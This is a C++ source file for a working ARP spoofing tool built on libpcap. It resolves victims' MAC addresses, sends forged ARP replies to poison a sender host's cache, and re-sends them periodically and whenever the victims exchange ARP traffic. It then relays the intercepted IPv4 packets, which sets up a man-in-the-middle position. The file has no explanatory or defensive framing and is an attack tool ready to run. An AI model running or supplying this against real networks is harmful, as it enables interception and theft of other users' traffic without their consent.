#include <arpa/inet.h>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth;
    ArpHdr arp;
};
#pragma pack(pop)

static_assert(sizeof(EthArpPacket) == 42,
              "Ethernet and ARP headers must be 42 bytes");

struct Session {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;
    EthArpPacket infection;
};

void usage() {
    std::printf(
        "syntax: arp-spoof <interface> <sender ip 1> <target ip 1> "
        "[<sender ip 2> <target ip 2> ...]\n"
    );
    std::printf(
        "sample: arp-spoof wlan0 "
        "192.168.10.2 192.168.10.1 "
        "192.168.10.1 192.168.10.2\n"
    );
}

bool parseIp(const char* text, Ip& ip) {
    in_addr address{};

    if (inet_pton(AF_INET, text, &address) != 1)
        return false;

    ip = Ip(ntohl(address.s_addr));
    return true;
}

bool getMyInfo(const char* dev, Mac& myMac, Ip& myIp) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    if (fd < 0) {
        std::perror("socket");
        return false;
    }

    ifreq ifr{};
    std::strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        std::perror("SIOCGIFHWADDR");
        close(fd);
        return false;
    }

    myMac = Mac(
        reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data)
    );

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        std::perror("SIOCGIFADDR");
        close(fd);
        return false;
    }

    auto* address =
        reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);

    myIp = Ip(ntohl(address->sin_addr.s_addr));

    close(fd);
    return true;
}

EthArpPacket makeArpPacket(
    const Mac& ethDst,
    const Mac& ethSrc,
    uint16_t operation,
    const Mac& arpSenderMac,
    const Ip& arpSenderIp,
    const Mac& arpTargetMac,
    const Ip& arpTargetIp
) {
    EthArpPacket packet{};

    packet.eth.dmac_ = ethDst;
    packet.eth.smac_ = ethSrc;
    packet.eth.type_ = htons(EthHdr::Arp);

    packet.arp.hrd_ = htons(ArpHdr::ETHER);
    packet.arp.pro_ = htons(EthHdr::Ip4);
    packet.arp.hln_ = Mac::Size;
    packet.arp.pln_ = Ip::Size;
    packet.arp.op_ = htons(operation);
    packet.arp.smac_ = arpSenderMac;
    packet.arp.sip_ =
        htonl(static_cast<uint32_t>(arpSenderIp));
    packet.arp.tmac_ = arpTargetMac;
    packet.arp.tip_ =
        htonl(static_cast<uint32_t>(arpTargetIp));

    return packet;
}

bool sendArp(pcap_t* pcap, const EthArpPacket& packet) {
    int result = pcap_sendpacket(
        pcap,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(packet)
    );

    if (result != 0) {
        std::fprintf(
            stderr,
            "pcap_sendpacket failed: %s\n",
            pcap_geterr(pcap)
        );
        return false;
    }

    return true;
}

bool sendRawPacket(
    pcap_t* pcap,
    const u_char* packet,
    int packetLength
) {
    if (pcap_sendpacket(pcap, packet, packetLength) != 0) {
        std::fprintf(
            stderr,
            "relay failed: %s\n",
            pcap_geterr(pcap)
        );
        return false;
    }

    return true;
}

bool isExpectedReply(
    const EthArpPacket& packet,
    const Mac& myMac,
    const Ip& myIp,
    const Ip& findIp
) {
    if (ntohs(packet.eth.type_) != EthHdr::Arp)
        return false;

    if (ntohs(packet.arp.op_) != ArpHdr::Reply)
        return false;

    Ip replySenderIp(
        ntohl(static_cast<uint32_t>(packet.arp.sip_))
    );

    Ip replyTargetIp(
        ntohl(static_cast<uint32_t>(packet.arp.tip_))
    );

    return replySenderIp == findIp &&
           replyTargetIp == myIp &&
           packet.arp.tmac_ == myMac;
}

bool resolveMac(
    pcap_t* pcap,
    const Mac& myMac,
    const Ip& myIp,
    const Ip& findIp,
    Mac& findMac
) {
    EthArpPacket request = makeArpPacket(
        Mac::broadcastMac(),
        myMac,
        ArpHdr::Request,
        myMac,
        myIp,
        Mac::nullMac(),
        findIp
    );

    for (int attempt = 1; attempt <= 3; ++attempt) {
        if (!sendArp(pcap, request))
            return false;

        auto deadline =
            std::chrono::steady_clock::now() +
            std::chrono::seconds(2);

        while (std::chrono::steady_clock::now() < deadline) {
            pcap_pkthdr* header = nullptr;
            const u_char* packet = nullptr;

            int result =
                pcap_next_ex(pcap, &header, &packet);

            if (result == 0)
                continue;

            if (result < 0) {
                std::fprintf(
                    stderr,
                    "pcap_next_ex failed: %s\n",
                    pcap_geterr(pcap)
                );
                return false;
            }

            if (header->caplen < sizeof(EthArpPacket))
                continue;

            const auto* reply =
                reinterpret_cast<const EthArpPacket*>(packet);

            if (!isExpectedReply(
                    *reply, myMac, myIp, findIp)) {
                continue;
            }

            findMac = reply->arp.smac_;
            return true;
        }

        std::fprintf(
            stderr,
            "ARP reply timeout (%d/3)\n",
            attempt
        );
    }

    return false;
}

bool infectSession(
    pcap_t* pcap,
    const Session& session
) {
    return sendArp(pcap, session.infection);
}

void infectAll(
    pcap_t* pcap,
    const std::vector<Session>& sessions
) {
    for (const Session& session : sessions)
        infectSession(pcap, session);
}

bool relayIpPacket(
    pcap_t* pcap,
    const pcap_pkthdr* header,
    const u_char* packet,
    const Mac& myMac,
    const std::vector<Session>& sessions
) {
    if (header->caplen < sizeof(EthHdr))
        return false;

    if (header->caplen != header->len)
        return false;

    const auto* originalEth =
        reinterpret_cast<const EthHdr*>(packet);

    if (ntohs(originalEth->type_) != EthHdr::Ip4)
        return false;

    for (const Session& session : sessions) {
        if (originalEth->smac_ != session.senderMac)
            continue;

        if (originalEth->dmac_ != myMac)
            continue;

        std::vector<u_char> relayPacket(
            packet,
            packet + header->caplen
        );

        auto* relayEth =
            reinterpret_cast<EthHdr*>(relayPacket.data());

        relayEth->smac_ = myMac;
        relayEth->dmac_ = session.targetMac;

        return sendRawPacket(
            pcap,
            relayPacket.data(),
            static_cast<int>(relayPacket.size())
        );
    }

    return false;
}

void reinfectIfNeeded(
    pcap_t* pcap,
    const pcap_pkthdr* header,
    const u_char* packet,
    const Mac& myMac,
    const std::vector<Session>& sessions
) {
    if (header->caplen < sizeof(EthArpPacket))
        return;

    const auto* arpPacket =
        reinterpret_cast<const EthArpPacket*>(packet);

    if (ntohs(arpPacket->eth.type_) != EthHdr::Arp)
        return;

    // Do not react to infection packets sent by this program.
    if (arpPacket->eth.smac_ == myMac)
        return;

    uint16_t operation = ntohs(arpPacket->arp.op_);

    Ip arpSenderIp(
        ntohl(static_cast<uint32_t>(arpPacket->arp.sip_))
    );

    Ip arpTargetIp(
        ntohl(static_cast<uint32_t>(arpPacket->arp.tip_))
    );

    for (const Session& session : sessions) {
        bool senderAsksForTarget =
            operation == ArpHdr::Request &&
            arpSenderIp == session.senderIp &&
            arpTargetIp == session.targetIp;

        bool targetRepliesToSender =
            operation == ArpHdr::Reply &&
            arpSenderIp == session.targetIp &&
            arpTargetIp == session.senderIp;

        if (!senderAsksForTarget &&
            !targetRepliesToSender) {
            continue;
        }

        infectSession(pcap, session);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];
    std::vector<Session> sessions;

    for (int i = 2; i < argc; i += 2) {
        Session session{};

        if (!parseIp(argv[i], session.senderIp) ||
            !parseIp(argv[i + 1], session.targetIp)) {
            std::fprintf(stderr, "invalid IP address\n");
            return EXIT_FAILURE;
        }

        sessions.push_back(session);
    }

    Mac myMac;
    Ip myIp;

    if (!getMyInfo(dev, myMac, myIp))
        return EXIT_FAILURE;

    char errbuf[PCAP_ERRBUF_SIZE]{};

    pcap_t* pcap =
        pcap_open_live(dev, 65535, 1, 100, errbuf);

    if (pcap == nullptr) {
        std::fprintf(
            stderr,
            "pcap_open_live: %s\n",
            errbuf
        );
        return EXIT_FAILURE;
    }

    if (pcap_datalink(pcap) != DLT_EN10MB) {
        std::fprintf(
            stderr,
            "Ethernet interface is required\n"
        );
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    std::string myMacText =
        static_cast<std::string>(myMac);

    std::printf(
        "attacker MAC: %s\n",
        myMacText.c_str()
    );

    for (Session& session : sessions) {
        if (!resolveMac(
                pcap, myMac, myIp,
                session.senderIp, session.senderMac)) {
            std::fprintf(
                stderr,
                "could not find sender MAC\n"
            );
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        if (!resolveMac(
                pcap, myMac, myIp,
                session.targetIp, session.targetMac)) {
            std::fprintf(
                stderr,
                "could not find target MAC\n"
            );
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        session.infection = makeArpPacket(
            session.senderMac,
            myMac,
            ArpHdr::Reply,
            myMac,
            session.targetIp,
            session.senderMac,
            session.senderIp
        );

        std::string senderIpText =
            static_cast<std::string>(session.senderIp);

        std::string targetIpText =
            static_cast<std::string>(session.targetIp);

        std::string senderMacText =
            static_cast<std::string>(session.senderMac);

        std::string targetMacText =
            static_cast<std::string>(session.targetMac);

        std::printf(
            "sender=%s/%s target=%s/%s\n",
            senderIpText.c_str(),
            senderMacText.c_str(),
            targetIpText.c_str(),
            targetMacText.c_str()
        );
    }

    infectAll(pcap, sessions);

    auto lastInfection =
        std::chrono::steady_clock::now();

    while (true) {
        auto now = std::chrono::steady_clock::now();

        if (now - lastInfection >=
            std::chrono::seconds(5)) {
            infectAll(pcap, sessions);
            lastInfection = now;
        }

        pcap_pkthdr* header = nullptr;
        const u_char* packet = nullptr;

        int result =
            pcap_next_ex(pcap, &header, &packet);

        if (result == 0)
            continue;

        if (result < 0) {
            std::fprintf(
                stderr,
                "pcap_next_ex failed: %s\n",
                pcap_geterr(pcap)
            );
            break;
        }

        if (relayIpPacket(
                pcap, header, packet,
                myMac, sessions)) {
            continue;
        }

        reinfectIfNeeded(
            pcap, header, packet,
            myMac, sessions
        );
    }

    pcap_close(pcap);
    return EXIT_FAILURE;
}
